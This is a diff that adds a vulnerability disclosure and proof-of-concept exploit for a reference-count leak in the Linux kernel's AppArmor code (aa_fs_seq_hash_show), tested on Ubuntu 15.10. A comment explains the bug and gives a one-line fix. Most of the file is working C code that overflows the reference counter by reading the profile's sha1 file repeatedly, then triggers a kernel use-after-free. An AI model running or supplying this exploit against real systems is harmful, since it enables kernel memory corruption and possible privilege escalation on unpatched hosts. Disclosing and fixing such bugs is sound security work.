@@ -1,0 +1,120 @@
+/*
+There's a reference count leak in aa_fs_seq_hash_show that can be used to overflow the reference counter and trigger a kernel use-after-free
+
+static int aa_fs_seq_hash_show(struct seq_file *seq, void *v)
+{
+	struct aa_replacedby *r = seq->private;
+	struct aa_profile *profile = aa_get_profile_rcu(&r->profile); // <--- takes a reference on profile
+	unsigned int i, size = aa_hash_size();
+
+	if (profile->hash) {
+		for (i = 0; i < size; i++)
+			seq_printf(seq, "%.2x", profile->hash[i]);
+		seq_puts(seq, "\n");
+	}
+
+	return 0;
+} // <-- no reference dropped
+
+See attached for a PoC that triggers a use-after-free on an aa_label object on Ubuntu 15.10 with the latest 4.2.0.35 kernel; the Ubuntu kernel appears to use an older version of AppArmor prior to some refactoring, but the same issue is present.
+
+static int aa_fs_seq_hash_show(struct seq_file *seq, void *v)
+{
+	struct aa_replacedby *r = seq->private;
+	struct aa_label *label = aa_get_label_rcu(&r->label); // <--- takes a reference on label
+	struct aa_profile *profile = labels_profile(label);
+	unsigned int i, size = aa_hash_size();
+
+	if (profile->hash) {
+		for (i = 0; i < size; i++)
+			seq_printf(seq, "%.2x", profile->hash[i]);
+		seq_puts(seq, "\n");
+	}
+
+	return 0;
+} // <--- no reference dropped
+
+I noticed in reproducing this issue that it appears that there has been a patch applied to the very latest Ubuntu kernel shipped in 16.04 that fixes this that hasn't been upstreamed or backported.
+
+The fix is just to correctly drop the acquired reference.
+
+index ad4fa49..798d492 100644
+--- a/security/apparmor/apparmorfs.c
++++ b/security/apparmor/apparmorfs.c
+@@ -331,6 +331,7 @@ static int aa_fs_seq_hash_show(struct seq_file *seq, void *v)
+ 			seq_printf(seq, "%.2x", profile->hash[i]);
+ 		seq_puts(seq, "\n");
+ 	}
++	aa_put_profile(profile);
+ 
+ 	return 0;
+ }
+*/
+
+#include <unistd.h>
+#include <fcntl.h>
+
+#include <keyutils.h>
+
+#include <err.h>
+#include <stdint.h>
+#include <stdlib.h>
+#include <stdio.h>
+
+#include <sys/apparmor.h>
+
+#define BASE_PATH "/sys/kernel/security/apparmor/policy/profiles/sbin.dhclient.2"
+#define HASH_PATH BASE_PATH "/sha1"
+
+void add_references(int hash_fd, int refs_to_add) {
+  char buf[1];
+  for (int i = 0; i < refs_to_add; ++i) {
+    pread(hash_fd, buf, sizeof(buf), 0);
+  }
+}
+
+int main(int argc, char** argv) {
+  int hash_fd;
+  int fds[0x100];
+  pid_t pid;
+  
+  hash_fd = open(HASH_PATH, O_RDONLY);
+  if (hash_fd < 0) {
+    err(-1, "failed to open HASH_PATH");
+  }
+
+  fprintf(stderr, "[*] forking to speed up initial reference count increments\n");
+  for (int i = 0; i < 0xf; ++i) {
+    if (!fork()) {
+      add_references(hash_fd, 0x11111100);
+      exit(0);
+    }
+  }
+  
+  for (int i = 0; i < 0xf; ++i) {
+    int status;
+    wait(&status);
+  }
+  fprintf(stderr, "[*] initial reference count increase finished\n");
+
+  fprintf(stderr, "[*] entering profile\n");
+  aa_change_profile("/sbin/dhclient");
+
+  pid = fork();
+  if (pid) {
+    for (int i = 0; i < 0x100; ++i) {
+      fds[i] = open("/proc/self/net/arp", O_RDONLY);
+    }
+  }
+  else {
+    add_references(hash_fd, 0x100);
+    exit(0);
+  }
+
+  fprintf(stderr, "[*] past the point of no return");
+  sleep(5);
+
+  for (int i = 0; i < 0x100; ++i) {
+    close(fds[i]);
+  }
+}
